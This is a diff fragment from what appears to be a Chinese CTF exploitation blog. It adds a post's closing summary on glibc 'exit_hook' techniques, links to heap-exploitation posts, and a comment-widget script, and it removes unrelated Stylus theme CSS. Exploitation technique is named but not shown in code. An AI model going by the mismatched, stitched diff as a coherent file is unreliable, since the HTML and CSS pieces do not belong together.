+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里从源码层面解释了两种exit_hook，并且在例题中两种方式都是使用了，国赛的这道题目是很简单的，我也想到第一种方法了，不过就是因为存在知识点的遗漏导致没做出来，也是在看了wp之后才了解了exit_hook，所以基础知识还是很重要不然思路会受到限制。第一道例题如果有需要可以评论。</p>
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/07/26/house-of-apple/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">house of apple</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/05/26/fastbin-reverse-into-tcache/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">fastbin_reverse_into_tcache</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;评论</i>
+    </div>
+    
+
+        
+            
+    <div class="valine-container">
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script >
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
+                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '😜若有问题请各位大师傅留言评论',
+                    lang: 'zh-CN'.toLowerCase()
+                });
+
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
+
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = '196082';
+
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
+
+            if ('false') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
 
 
-  .article-header {
-    position: relative;
-    padding-left: $avatarWidth;
-    width: 100%;
-    height: $avatarWidth;
-    box-sizing: border-box;
 
-    .avatar {
-      position: absolute;
-      top: 0
-      left: 0;
-      width: $avatarWidth;
-      height: $avatarWidth;
-      padding: 1px;
-      box-sizing: border-box;
-      border: 1px solid var(--border-color);
-      border-radius: 50%;
+        
+    
+</div>
 
-      img {
-        border-radius: 50%;
-        width: 100%;
-        height: 100%;
-        background: var(--avatar-background-color);
-      }
-
-    }
-
-
-    .info {
-      padding: 2px 0;
-      margin-left: 10px;
-      box-sizing: border-box;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      width: 100%;
-      height: 100%;
-
-      .author {
-        font-weight: 600;
-        font-size: 1.18rem;
-        display: flex;
-        align-items: center;
-
-        .name {
-          color: var(--default-text-color);
-        }
-
-        .author-label {
-          margin-left: 10px;
-          font-size: 0.8rem;
-          font-weight: 500;
-          padding: 0 5px;
-          border-radius: 5px;
-          color: #fff;
-          background: var(--selection-color);
-        }
-
-      }
-    }
-
-  }
-
-
-  .article-header, .article-header-meta-info {
-    margin-top: 16px;
-    +keep-tablet() {
-      transform: scale(0.9);
-      transform-origin: left top;
-    }
-  }
-
-
-  .article-content {
-    margin-top: $component-spacing-value;
-    padding-bottom: 10px;
-    word-wrap: break-word;
-    border-bottom: 1px solid var(--border-color);
-    color: var(--default-text-color);
-  }
-
-  .post-copyright-info {
-    margin-top: $component-spacing-value;
-    width: 100%;
-  }
-
-  .article-nav {
-    height: 40px;
-    margin-top: $component-spacing-value;
-
-    .article-prev, .article-next {
-      max-width: $post-nav-max-width;
-      height: 100%;
-      box-sizing: border-box;
-
-      keep-container(true, 1.03, 1.03, 10px, 0);
-
-      a {
-        position: relative;
-        display: block;
-        width: 100%;
-        height: 100%;
-        box-sizing: border-box;
-
-        &.prev {
-          padding-left: $arrow-icon-width;
-        }
-
-        &.next {
-          padding-right: $arrow-icon-width;
-        }
-
-        .arrow-icon {
-          position: absolute;
-          top: 0;
-          height: 100%;
-          width: $arrow-icon-width;
-
-          &.left {
-            left: 0;
-          }
-
-          &.right {
-            right: 0;
-          }
-        }
-
-        .title {
-          width: 100%;
-          height: 100%;
-        }
-      }
-
-    }
-
-    .article-prev {
-      float: left;
-    }
-
-    .article-next {
-      float: right;
-    }
-
-    .post-nav-item {
-      display: none;
-
-      +keep-tablet() {
-        display: inline-block;
-      }
-
-    }
-
-
-    .post-nav-title-item {
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-
-      +keep-tablet() {
-        display: none;
-      }
-    }
-
-  }
-
-
-}
-
+            </div>
+        
+    </div>
+</div>
 
 
                 
